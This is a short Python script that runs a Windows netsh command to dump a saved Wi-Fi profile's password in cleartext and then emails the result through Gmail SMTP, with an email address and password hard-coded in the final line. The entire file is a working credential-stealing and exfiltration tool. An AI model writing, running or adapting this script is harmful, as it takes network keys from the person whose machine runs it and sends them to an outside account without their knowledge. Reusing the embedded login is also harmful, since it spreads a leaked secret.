#!/usr/bin/env python

import subprocess, smtplib


def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()

command = "netsh wlan show profile UPC____ key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("rishabh98@gmail.com", "Rishabh7&12345", result)